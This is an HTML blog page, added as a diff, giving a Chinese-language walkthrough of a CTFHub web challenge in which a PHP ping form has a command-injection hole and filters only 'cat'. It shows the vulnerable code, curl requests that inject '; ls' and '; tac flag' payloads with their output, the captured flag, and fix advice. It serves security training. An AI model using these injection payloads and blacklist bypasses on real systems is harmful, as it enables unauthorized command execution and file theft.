@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 命令注入-过滤 cat Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 820px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; word-break: break-all; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; white-space: pre-wrap; word-break: break-all; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 命令注入-过滤 cat</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># RCE</span>
+            <span class="tag"># 命令注入</span>
+            <span class="tag"># 黑名单绕过</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>命令注入-过滤 cat</li>
+            <li><strong>题目方向：</strong>Web - RCE</li>
+            <li><strong>运行环境：</strong>PHP</li>
+            <li><strong>题目目标：</strong>绕过 <code>cat</code> 命令过滤，读取 Web 目录中的动态 Flag 文件。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>页面源码暴露了后端逻辑。用户输入的 <code>ip</code> 被直接拼接到 <code>ping</code> 命令中，服务端只使用正则表达式过滤小写字符串 <code>cat</code>：</p>
+        <pre>&lt;?php
+$ip = $_GET['ip'];
+$m = [];
+
+if (!preg_match_all("/cat/", $ip, $m)) {
+    $cmd = "ping -c 4 {$ip}";
+    exec($cmd, $res);
+} else {
+    $res = $m;
+}
+?&gt;</pre>
+        <p>过滤没有移除命令分隔符，因此 <code>;</code>、<code>&amp;&amp;</code>、<code>|</code> 等仍可截断原命令。同时，黑名单只检查是否出现连续的 <code>cat</code>，没有限制其他等价文件读取工具，也没有校验输入是否为合法 IP。</p>
+        <p class="note">常用替代命令包括 <code>tac</code>、<code>nl</code>、<code>grep</code>、<code>sed</code>、<code>head</code>、<code>tail</code> 和 <code>strings</code>。本题使用 <code>tac</code>，它与 <code>cat</code> 输出方向相反但不影响读取单行 Flag。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>验证命令执行并列出 Web 目录：</strong>
+                <pre>curl.exe -sS --get ^
+  --data-urlencode "ip=127.0.0.1; pwd; ls -la" ^
+  "http://&lt;challenge-host&gt;:10800/"</pre>
+                <p>响应中出现当前目录和随机命名的 Flag PHP 文件：</p>
+                <pre>/var/www/html
+total 20
+drwxr-xr-x    1 www-data www-data      4096 Sep 23 11:18 .
+drwxr-xr-x    1 root     root          4096 Jan 30  2020 ..
+-rw-r--r--    1 root     root            42 Sep 23 11:18 flag_193511895917731.php
+-rw-r--r--    1 root     root           654 Feb 20  2020 index.php</pre>
+                <p>Flag 文件名由环境动态生成，实际解题时应以目录列表结果为准。</p>
+            </li>
+            <li>
+                <strong>使用 tac 绕过 cat 过滤：</strong>
+                <pre>curl.exe -sS --get ^
+  --data-urlencode "ip=127.0.0.1; tac /var/www/html/flag_193511895917731.php" ^
+  "http://&lt;challenge-host&gt;:10800/"</pre>
+                <p>命令执行结果被 <code>exec()</code> 收集并通过 <code>print_r()</code> 回显：</p>
+                <pre>&lt;?php // ctfhub{d99986e65e5c7e67245b4846}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{d99986e65e5c7e67245b4846}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>严格校验输入：</strong>使用 <code>filter_var($ip, FILTER_VALIDATE_IP)</code> 校验目标地址，拒绝包含分隔符和命令参数的输入。</li>
+            <li><strong>不要拼接 Shell 命令：</strong>优先采用参数分离的执行方式；若确实需要拼接，使用 <code>escapeshellarg()</code> 处理每个参数。</li>
+            <li><strong>不要依赖关键字黑名单：</strong>同类工具和编码方式很多，单靠过滤 <code>cat</code> 无法阻止命令执行或文件读取。</li>
+            <li><strong>最小化权限：</strong>限制 Web 服务账户的权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。</li>
+            <li><strong>关闭源码回显：</strong>避免在生产或挑战业务页面使用 <code>show_source()</code>、<code>highlight_file()</code> 暴露后端实现。</li>
+        </ul>
+    </div>
+</body>
+</html>
